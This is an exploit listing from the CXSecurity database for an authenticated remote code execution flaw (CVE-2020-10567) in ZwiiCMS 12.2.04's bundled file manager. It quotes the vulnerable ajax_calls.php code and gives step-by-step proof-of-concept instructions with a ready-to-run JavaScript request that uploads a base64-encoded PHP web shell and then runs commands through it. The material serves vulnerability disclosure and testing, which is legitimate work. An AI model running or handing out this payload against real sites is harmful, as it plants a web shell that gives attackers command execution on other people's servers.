---
title: ZwiiCMS 12.2.04 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023030022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-10
fetch_date: 2025-10-04T09:04:39.665815
---

# ZwiiCMS 12.2.04 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZwiiCMS 12.2.04 Remote Code Execution** **2023.03.09**  Credit:  **[Hadi Mene](https://cxsecurity.com/author/Hadi%2BMene/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-10567](https://cxsecurity.com/cveshow/CVE-2020-10567/ "Click to see CVE-2020-10567")**  CWE: **[CWE-20](https://cxsecurity.com/cwe/CWE-20 "CWE-20")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: ZwiiCMS 12.2.04 Remote Code Execution (Authenticated)
# Date: 03/06/2023
# Exploit Author: Hadi Mene
# Vendor Homepage: https://zwiicms.fr/
# Version: 12.2.04 and potentially lower versions
# CVE: CVE-2020-10567
# Category: webapps
ZwiiCMS 12.2.04 uses "Responible FileManager" 9.14.0 for its file manager feature. ZwiiCMS is vulnerable to CVE-2020-10567 as it is possible for
an authenticated user to use ajax\_calls.php to upload a php file via a base64 encoded file and gain Remote Code Execution
due to a lack of extension check on the uploaded file.
Original CVE author : hackoclipse
https://github.com/trippo/ResponsiveFilemanager/issues/600
Vulnerable code (ajax\_calls.php) :
// there is no extension check on $\_POST['name'] and the content of $\_POST['url'] can be b64 decoded without being
necessarily an image
81 case 'save\_img':
82 $info = pathinfo($\_POST['name']);
83 $image\_data = $\_POST['url'];
84
85 if (preg\_match('/^data:image\/(\w+);base64,/', $image\_data, $type)) {
86 $image\_data = substr($image\_data, strpos($image\_data, ',') + 1);
87 $type = strtolower($type[1]); // jpg, png, gif
88
89 $image\_data = base64\_decode($image\_data);
PoC:
1) Login in the Administration Panel.
2) Click on the Folder icon on the top of the panel.
3) Open the Developer Tools for that page.
4) Copy,Edit and Execute the Javascript Code below .
5) Access your PHP shell at http://ZWIICMS\_URL/site/file/source/shell.php?cmd=COMMAND
Javascript Code
######
function submitRequest()
{
var xhr = new XMLHttpRequest();
xhr.open("POST", "https:\/\/192.168.0.27\/zwiicms\/core\/vendor\/filemanager\/ajax\_calls.php?action=save\_img", true);
xhr.setRequestHeader("Accept", "\*\/\*");
xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
xhr.withCredentials = true;
var body = "url=data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==&path=&name=shell.php";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
}
submitRequest();
######

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top